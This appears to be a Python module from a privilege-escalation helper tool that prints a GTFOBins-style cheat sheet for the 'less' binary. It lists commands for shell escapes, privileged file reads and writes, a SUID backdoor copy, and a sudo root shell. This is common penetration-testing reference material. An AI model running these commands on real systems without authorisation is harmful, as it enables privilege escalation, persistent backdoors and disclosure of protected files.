from gbit.var import *

gtfobin = f"""
{SHELL}
{line}
{colored("It can be used to break out from restricted environments by spawning an interactive system shell.", 'blue')}
{colored("(a) less /etc/profile", 'green')}
{colored("    !/bin/sh", 'green')}

{colored('(b) VISUAL="/bin/sh -c "/bin/sh" less /etc/profile', 'green')}
{colored("    v", 'green')}

{File_Write}
{line}
{colored("It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.", 'blue')}
{colored("(a) echo DATA | less", 'green')}
{colored(f"    s{file_to_write}", 'green')}
{colored("    q", 'green')}

{colored("    This invokes the default editor to edit the file. The file must exist.", 'blue')}

{colored(f"(b)less {file_to_write}", 'green')}
{colored("   v", 'green')}

{File_Read}
{line}
{colored("It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.", 'blue')}
{colored(f"(a) less {file_to_read}", 'green')}

{colored("    This is useful when less is used as a pager by another binary to read a different file.", 'blue')}

{colored("(b) less /etc/profile", 'green')}
{colored(f"   :e {file_to_read}", 'green')}

{SUID}
{line}
{colored("If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to", 'blue')}
{colored("access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to", 'blue')}
{colored("run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default 'sh'", 'blue')}
{colored("shell to run with SUID privileges.", 'blue')}

{colored("This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To", 'blue')}
{colored("interact with an existing SUID binary skip the first command and run the program using its original", 'blue')}
{colored("path.", 'blue')}

{colored("sudo install -m =xs $(which less) .", 'green')}
{colored(f"./less {file_to_read}", 'green')}

{SUDO}
{line}
{colored("If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and", 'blue')}
{colored("may be used to access the file system, escalate or maintain privileged access.", 'blue')}

{colored("sudo less /etc/profile", 'green')}
{colored("!/bin/sh", 'green')}

{colored("cheers, wolf 🐺.", 'red', 'on_yellow', attrs=['bold', 'dark'])}
"""